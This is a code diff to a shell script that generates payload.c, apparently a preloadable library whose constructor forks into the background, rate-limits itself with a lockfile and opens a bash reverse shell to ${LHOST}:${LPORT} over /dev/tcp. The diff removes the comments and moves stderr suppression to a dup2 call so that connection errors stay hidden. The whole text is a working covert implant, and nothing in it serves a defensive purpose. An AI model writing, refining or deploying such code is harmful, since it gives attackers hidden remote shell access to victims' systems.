@@ -15,12 +15,11 @@ cat <<EOF > payload.c
 #include <sys/stat.h>
 #include <time.h>
 #include <string.h>
+#include <fcntl.h>
 
 static int _should_fire(void) {
-    // Check if already inside a shell
     if (getenv("RE_SHELL")) return 0;
 
-    // Rate limiting check
     struct stat st;
     if (stat("${LOCKFILE}", &st) == 0) {
         time_t now; time(&now);
@@ -38,11 +37,16 @@ static void _init(void) {
     setsid();
     if (fork() != 0) _exit(0);
 
-    // Set an environment variable so sub-shells don't re-trigger the loop
     setenv("RE_SHELL", "1", 1);
 
-    // Redirect stderr to /dev/null so "Connection refused" stays hidden
-    char *args[] = {"/bin/bash", "-c", "bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1 2>/dev/null", NULL};
+    // Force silence by redirecting stderr (fd 2) to /dev/null at the OS level
+    int fd = open("/dev/null", O_RDWR);
+    if (fd != -1) {
+        dup2(fd, 2);
+        close(fd);
+    }
+
+    char *args[] = {"/bin/bash", "-c", "bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1", NULL};
     execv("/bin/bash", args);
     _exit(0);
 }
